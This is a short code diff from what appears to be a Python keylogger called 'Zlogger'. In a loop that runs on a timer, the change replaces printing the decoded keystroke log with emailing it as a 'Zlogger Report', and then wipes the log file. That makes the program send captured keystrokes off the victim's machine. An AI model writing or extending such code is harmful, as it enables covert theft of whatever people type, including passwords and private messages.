@@ -128,8 +128,8 @@ def send_mail_reports_every(interval):
     chars_dict = generate_chars_dict(kmap)
     while True:
         sleep(interval)
-        print translate_log(LOG_FILE, chars_dict)
-
+        logs = translate_log(LOG_FILE, chars_dict)
+        send_mail("Zlogger Report", logs)
         with open(LOG_FILE, "w"):
             pass
 
